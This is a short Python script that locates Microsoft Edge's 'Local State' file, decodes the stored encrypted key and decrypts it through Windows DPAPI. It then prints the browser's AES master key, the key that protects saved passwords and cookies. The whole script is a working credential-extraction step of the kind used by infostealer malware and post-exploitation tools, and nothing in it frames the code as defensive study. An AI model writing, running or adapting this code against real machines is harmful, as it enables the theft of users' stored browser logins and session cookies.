import json
import base64
import os
from win32crypt import CryptUnprotectData

# Expand environment variable to get actual path
local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')

# Open and parse the Local State JSON file
with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

# Decode the base64-encoded DPAPI-encrypted key
encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

# Remove 'DPAPI' prefix (first 5 bytes)
encrypted_key = encrypted_key[5:]

# Decrypt AES key using Windows DPAPI
aes_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1] # can also CryptUnprotectData(encrypted_key)[1] as [1] is the result

print(f"[+] Decrypted AES Key: {aes_key.hex()}")
print(f"[+] Decrypted AES Key: {aes_key}")